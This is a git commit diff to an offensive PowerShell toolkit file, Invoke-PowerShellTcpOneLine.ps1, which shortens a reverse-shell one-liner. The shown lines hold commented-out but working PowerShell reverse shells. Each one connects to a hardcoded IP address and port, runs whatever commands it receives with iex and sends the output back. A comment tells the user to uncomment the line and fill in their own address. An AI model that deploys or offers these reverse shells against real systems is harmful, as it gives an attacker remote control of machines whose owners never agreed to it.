95b69acc7a9cef03f0afc63e9456e14be9773518
Gus Ruben <gusruben@protonmail.com>
2022-03-26 12:41:32 -0400

    Compact Invoke-PowerShellTcpOneLine.ps1

--- Shells/Invoke-PowerShellTcpOneLine.ps1
+++ Shells/Invoke-PowerShellTcpOneLine.ps1
@@ -2,5 +2,5 @@
 #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
 #$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+#$s=([Net.Sockets.TCPClient]::new('192.168.254.1',55555)).GetStream();$b=[byte[]]'0'*65535;$a=[Text.Encoding]::ASCII;while($i=$s.Read($b,0,65535)){$d=$a.GetString($b,0,$i);$t=$a.GetBytes((iex $d 2>&1));$s.write($t,0,$t.length)}
 
